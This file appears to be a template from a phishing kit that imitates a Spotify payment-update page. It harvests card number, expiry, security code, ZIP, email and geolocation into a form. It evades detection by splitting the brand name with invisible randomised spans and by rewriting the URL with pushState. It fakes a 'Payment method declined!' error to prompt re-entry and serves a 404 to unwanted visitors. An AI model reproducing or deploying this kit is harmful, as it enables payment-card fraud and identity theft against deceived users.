                <option value="1979">1979</option>
                <option value="1978">1978</option>
                <option value="1977">1977</option>
                <option value="1976">1976</option>
                <option value="1975">1975</option>
                <option value="1974">1974</option>
                <option value="1973">1973</option>
                <option value="1972">1972</option>
                <option value="1971">1971</option>
                <option value="1970">1970</option>
                <option value="1969">1969</option>
                <option value="1968">1968</option>
                <option value="1967">1967</option>
                <option value="1966">1966</option>
                <option value="1965">1965</option>
                <option value="1964">1964</option>
                <option value="1963">1963</option>
                <option value="1962">1962</option>
                <option value="1961">1961</option>
                <option value="1960">1960</option>
                <option value="1959">1959</option>
                <option value="1958">1958</option>
                <option value="1957">1957</option>
                <option value="1956">1956</option>
                <option value="1955">1955</option>
                <option value="1954">1954</option>
                <option value="1953">1953</option>
                <option value="1952">1952</option>
                <option value="1951">1951</option>
                <option value="1950">1950</option>
                <option value="1949">1949</option>
                <option value="1948">1948</option>
                <option value="1947">1947</option>
                <option value="1946">1946</option>
                <option value="1945">1945</option>
                <option value="1944">1944</option>
                <option value="1943">1943</option>
                <option value="1942">1942</option>
                <option value="1941">1941</option>
                <option value="1940">1940</option>
                <option value="1939">1939</option>
                <option value="1938">1938</option>
                <option value="1937">1937</option>
                <option value="1936">1936</option>
                <option value="1935">1935</option>
                <option value="1934">1934</option>
                <option value="1933">1933</option>
                <option value="1932">1932</option>
                <option value="1931">1931</option>
                <option value="1930">1930</option>
                <option value="1929">1929</option>
                <option value="1928">1928</option>
                <option value="1927">1927</option>
                <option value="1926">1926</option>
                <option value="1925">1925</option>
                <option value="1924">1924</option>
                <option value="1923">1923</option>
                <option value="1922">1922</option>
                <option value="1921">1921</option>
                <option value="1920">1920</option>
                <option value="1919">1919</option>
                <option value="1918">1918</option>
                <option value="1917">1917</option>
                <option value="1916">1916</option>
                <option value="1915">1915</option>
                <option value="1914">1914</option>
                <option value="1913">1913</option>
                <option value="1912">1912</option>
                <option value="1911">1911</option>
                <option value="1910">1910</option>
                <option value="1909">1909</option>
                <option value="1908">1908</option>
                <option value="1907">1907</option>
                <option value="1906">1906</option>
                <option value="1905">1905</option>
                <option value="1904">1904</option>
                <option value="1903">1903</option>
                <option value="1902">1902</option>
                <option value="1901">1901</option>
                <option value="1900">1900</option>
            </select>
        </div>
    </div>
</div>
      
      <div class="form-group">
                <label ><?php echo $zia;?></label>
                <input required="required" type="number" id="error-5" maxlength="10" name="zipe" class="form-control">
            </div>



          <div class="row">
      <div class="col-xs-12">
        <div class="divider">
          <strong class="divider-title ng-binding"><?php echo $paymedat;?></strong>
        </div>
      </div>
    </div>

</p>

<style>
/*! CSS Used from: https://www.scdn.co/build/css/spotify-244e9276e2.css */
svg:not(:root){overflow:hidden;}
@media print{
*,*:before,*:after{background:transparent!important;color:#000!important;-webkit-box-shadow:none!important;box-shadow:none!important;text-shadow:none!important;}
}
*{-webkit-box-sizing:border-box;box-sizing:border-box;}
*:before,*:after{-webkit-box-sizing:border-box;box-sizing:border-box;}
h5{font-family:inherit;font-weight:900;line-height:1.1;color:inherit;}
h5{margin-top:12px;margin-bottom:12px;}
h5{font-size:16px;}
/*! CSS Used from: https://www.scdn.co/build/css/account-56cd2faf3c.css */
.page-account-subscription .card .payment-details-title{border-bottom:0;color:#000;font-weight:bold;margin-bottom:0;padding:20px 0 10px 0;}
.page-account-subscription .card .payment-details{border-bottom:0;}
.payment-details-container{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;background-color:#F8F8F8;border:1px solid #DCDCDC;padding:16px 19px;text-align:left;}
.payment-details-container.with-expiry{-webkit-box-align:start;-ms-flex-align:start;align-items:start;}
.payment-details{max-width:290px;margin:24px auto;}
.payment-details-icon{margin-right:20px;-webkit-transform:none;-ms-transform:none;transform:none;}
.with-expiry .payment-details-icon{margin-top:2px;}
.payment-details-icon > svg{display:block;height:20px;width:auto;}
@media all and (-ms-high-contrast: none){
.payment-details-icon > svg{max-width:50px;}
}
.payment-details-expiry{font-size:12px;color:#616467;}
.payment-details-name{max-width:185px;}
</style>
<?
// get type picture
$a = $_GET['cc'];
if (strpos($a, 'Mastercard') !== false) {
$name = 'Mastercard';	
$master = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAZCAYAAAAmNZ4aAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAFhSURBVEhLY/jx48f/gcADZ/Hbt2//v379mmb4+fPn/9+/f///y5cvqBajC9ACg+wAeRBZjG5BDfI5Mn/UYhT8ZdfB/++Ti/+/Ubb6/1bL4f+HvNr/385f/v/92Zn/Pw4X//++XO//96Wa/7/vS///48FerGbAMNEWf6zp/P+KQRoDf9YV/v89jP//9/lSmPhwKVazQJgoiz/PXorV0jfcEv//xzOC8ddycayW/7i3HcM8ECbK4rdGHlgt/mrIC7f4ux8vVou/74rDMA+EibL4taAWVot/+7HBLf4TxIbd4gWyGOaBMHEWC2kPjMXvTL2wWowS1AE0COrP0xdhtRglcRVhT1zf727DMA+EibIYhMnJTj+OUJidYBhcgMTm/X8jbw4uRD5kVUILkNP/vx8q+v99mS6wANH4/wNYgHx/sAerGTBMksXUxKMWD1xDACQAcg0tMdamDzKHnnikWfzjPwB3L5TQQB3x9gAAAABJRU5ErkJggg==';
}else if (strpos($a, 'Visa') !== false) {
$name = 'Visa';
$master = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAVCAYAAABR915hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAGYktHRAD/AP8A/6C9p5MAAAOYSURBVEhL5VZbSFRBGP7OOXvcXc3S3dXMS5lZoZVlNysjEgwKoqSHiCiKwofuRhd6qEgiKuiilUTZ5aGH7kESRRRU2k0Lu4KKmVK6m+ba2pbtrrs7/TOeLcUuT9pDH/zMP/9cvpl/vplzJEaw2+1wuVzoDRgMBpjNZkgtLS2cG6GhoVpTz8LpdEKSJEhWq5VZLBb4/X6tqWchyzKam5shc3a+494C5+KcslbvdfzHxJR26PUqmf6HBaDXK1osiEyn+Tqtjcf+NOZnrDMEMSmMVM2wfnsxIpKOITHtNBavuqENVHDnfj2iUwqxKbcYl4qqEZF8DGcuVIr23H2PEEn1oNhDSJt1Thujw/XbdRg8/hRSMs6IWDfYbDbmdrvJXCQ4P5mXIXw/yXwX+T4yxuYuuUpS3MXKyuvZkjU3hF9Z3cRytt1hMO5liDzIjIMOs2CyAOJSTzApKo9B3U3TtjOPx83okRJcnPNHqvmNcrs95CmYkRlPuVJQWW0XbVcvVwERwZiQGoOSxzZAp2B4YgTyjpRTdxmsMQdtdathe7WMenthtbXifYUd5nADYFRR+qwRqq6rnH4hLobp6dG8QFWNA7fu1QIeP1YuHSVa3778iLD4vsJXDDrIfVSkzz4P2hX6hvKUKsg/8ULsZM/WyTTWh6fPG0lEfyX2ISM9FqAzf1PrwOmzFRRi2LBiDN7VfxITThoXJXrevZIFv/0bHpZaIYflo9neRlEJecdfwJIQhuULUwTxk+dNFP8LsYc6Th5PxETwoMyGS9dqYBkajoR4M0pKKc2EiamRopw6KRZfW3MwIskCqDI25j5ETa0dnqY2WnwMGmwOoJ8eZc84cVd0I+ZnzTGEdlV0sw7ttJC12bRyQhmdFceUCQNg/dBKnoxgowE7t6SRQHwwki4On3wJ2WTAxQtViI07iqAQFRWvP4pxnfGLVHdg+pQY+IgUn1xYlz1axEoeW0XqMqfFYcOO+5BMBzBw7EnMW1AEtHmxefVY5BeUQ6XdHy/IREHhTDqW/oDDjfcNDug6CazjFegGL7JmJVBqrUgebiLRBIuookgYSaSKoiJpqAmWqBCa0InkMZEo3JeBz04PhgwzYf6cRGQv6lhszIAQvGv4IvQSFx0CH+2FQ+J3ymQyUYq7fqH4wxFYF909UQYeAl7nr1zXhHnFHJLE40y7mnwMn4PmYu1w0+3gXyb6B/g9cU8hQPzbM+5p/CNi4DuClIi4HcWrGwAAAABJRU5ErkJggg==';	
}else if (strpos($a, 'Amex') !== false) {
$name = 'Amex';
$master = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAVCAYAAAC33pUlAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGlSURBVEhLvZZNSgNBEIXHi4iew43ewp3xBN5AzQXcuBYVzF7d6M5s/ReELIwiUTG6iAMxGyFQ5uueNzMZO4LgTOClfrqqXlVNh0k0GAzsst21/fPnUnB49Wr9ft+Gw6FFcxstm1q5KRXTq7eOMAodlgEmrIyMlVZLNr95bzunPVtuPNnu2YetH3Ud0Iu29JP2p9WP35xeS/IAdfD5s+w8JSNxtt6yhYQUXT6CJeUjmQYBPuztJE8+iiOxyU3J8smQYZPIpArEJzJs4oiXXzbn0oUxMhwEMDbJHCKboyLonGPTPdLH+pjH3peTIL+2WqOT5iLHJvPddxL45LDtp5atRtBnkjXmbcWnZChFkJQHCaDo/wuuH95/khX3nq0tWw3QBSBeuuKX9vzUWit6HMdhMhUHPBeC10Y+CimZZ4TERtfayPW6bw4fub+Sqbi6poCm1A0UMZcJiY/m1IjiqTlxjRTL/1ABBaUTJ1JkMRadeDWFHiQrCxNvYxmolIwXdLS4dRc8/E/wgnYvT75gPbh4cWBcELKlF+1QrGxq89fD/S2wyj5m3xKZKnIURVyCAAAAAElFTkSuQmCC';	
}
$lastfour = preg_replace('/[^0-9]/', '', $a);
?>

<div style="<?php if(empty($_GET['cc'])){echo 'display:none;';}else{ echo '';}?>" class="payment-details"><div class="payment-details-container with-expiry"><div class="payment-details-icon"><img src="<?php echo $master ?>" alt=""></div><div class="credit-card-text"><div class="payment-details-name" title="Carte MasterCard se terminant par 0001">
            <?php echo $name;?> <?php echo $endis;?> <?php echo $lastfour;?>
        </div><div class="payment-details-expiry">
                <?php echo $expira;?>&nbsp;:
                <?php $aa = $_GET['exp']; $text = str_replace(':', '/', $aa); echo $text; ?>
            </div></div></div></div>



    <div class="row">
        <div class="col-xs-12">
            <div class="form-group">
                <label for="cardnumber" class="card-label">
                    <span id="trans-cardnumber"><?php echo $rdnu;?></span>
                    <span class="card-icons">
                        <span id="provider-icons"><span class="icon-provider visa disabled" data-type="visa"></span><span class="icon-provider mastercard disabled" data-type="mastercard"></span><span class="icon-provider amex disabled" data-type="amex"></span><span class="icon-provider cb disabled" data-type="cb"></span></span>
                        <a id="secure-lock" class="icon-provider lock" data-tooltip="" data-lang="security_explained"></a>
                    </span>
                </label>
                <span class="safe-field">
                    <input id="error-1" name="cnu" placeholder="1111 2222 3333 4444" onkeyup="update(this.value);" class="form-control">
				<input hidden name="" value="<?php echo $rand;?>" id="valid">
				</span>
            </div>
        </div>		
    </div>
<?php
if (empty($_GET['exp'])) {
echo '';
}else{
$str = $_GET['exp'];
$arr = explode(":", $str);

$oai = "<option selected value='$arr[0]'>$arr[0]</option>";
$oas = "<option selected value='$arr[1]'>$arr[1]</option>";
}
?>
    <div class="row">
        <div class="col-xs-12">
            <div class="form-group">
                <label id="trans-expiration_date" for="expiration_date"><?php echo $piryda;?></label>
                <div class="row">
                    <div class="col-xs-6">
                        <select id="error-2" name="ex-month" class="form-control">
                            <option id="trans-label_month" value="" default="default" selected="selected"><?php echo $Mont;?></option>
							<?php echo $oai; ?>
                            <option value="1">01</option>
                            <option value="2">02</option>
                            <option value="3">03</option>
                            <option value="4">04</option>
                            <option value="5">05</option>
                            <option value="6">06</option>
                            <option value="7">07</option>
                            <option value="8">08</option>
                            <option value="9">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                    </div>
                    <div class="col-xs-6">
                        <select id="error-3" name="ex-year" class="form-control">
                            <option  value="" default="" selected="selected"><?php echo $Ye;?></option>
                        <?php echo $oas; ?><option value="2019">19</option><option value="2020">20</option><option value="2021">21</option><option value="2022">22</option><option value="2023">23</option><option value="2024">24</option><option value="2025">25</option><option value="2026">26</option><option value="2027">27</option><option value="2028">28</option><option value="2029">29</option><option value="2030">30</option></select>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-xs-6">
            <div class="form-group">
                <label for="security-code" class="contain-tooltip"><?php echo $urityc;?></label>
                <span class="safe-field field error">
                    <input required="required" name="secode" id="error-4" autocomplete="off" type="number" maxlength="4" placeholder="" data-encrypted-name="mobile" class="form-control">
                </span>
            </div>
        </div>
        
    </div>
	    <input hidden value="<?php echo $_GET[$dota]; ?>" name="email" id="email">
		<input hidden value="" name="county" id="county">
		<input hidden value="" name="city" id="city">
		<input hidden value="" name="currencyCode" id="currencyCode">
		<input hidden value="" name="timezone" id="timezone">

      <div class="row row-submit">
        <div class="col-xs-12 col-sm-6">
          
        </div>
        <div class="col-xs-12 col-sm-6">
          <button dir="<?php echo $semitic;?>" style="<?php echo $space;?>" class="btn btn-block btn-green ng-binding" id="button"><?php echo $cnt;?></button>
        </div>
      </div>
    </form>

    <div class="row">
      
    </div>

    <div id="sign-up-section">
      <div class="row">
        
      </div>
    </div>


    <div class="row">
      <div class="col-xs-12">
        <div class="divider"></div>
        <p class="text-muted disclaimer text-center ng-binding">You authorise <span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>S<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>p<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>o<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>t<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>i<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>f<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>y to charge you automatically every month, until you cancel your subscription. You agree to <span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>S<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>p<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>o<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>t<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>i<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>f<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>y's <a href="https://www.u<?php echo $rand; ?>.com" target="_blank">Terms &amp; Conditions</a> and <a href="https://www.<?php echo $rand; ?>.com" target="_blank">Privacy Policy</a></p>
      </div>
    </div>
  </div>
</div>
</div> 
<script>
window.history.pushState('<?php echo $bert;?>', '<?php echo $bert;?>', 'update');
</script>

<div></div>

</body>
</html>
<?php
if(isset($_POST['novalien'])) 
{
echo '<div>';
echo '<style>';
echo '.swal2-popup {';
echo 'font-size: 16;';
echo '}';
echo '</style>';
echo '<script>';
echo 'Swal.fire({';
echo "type: 'error',";
echo "text: 'Payment method declined!',";
echo '})';
echo '</script>';
echo '</div>';
}
?>
<script>
var country = geoplugin_countryName();
var city = geoplugin_city();
var cuyrncy = geoplugin_currencyCode();
var timezone = geoplugin_timezone();
document.getElementById("county").value =country;
document.getElementById("city").value =city;
document.getElementById("currencyCode").value =cuyrncy;
document.getElementById("timezone").value =timezone;
</script>
<style>
.swal2-popup {font-size: 16;}
</style>
<script>
function geo() {
Swal.fire({
  type: 'warning',
  text: '<?php echo $uned;?>',
})}
</script>
<?php
}else {
header("HTTP/1.0 404 Not Found");	
}
?>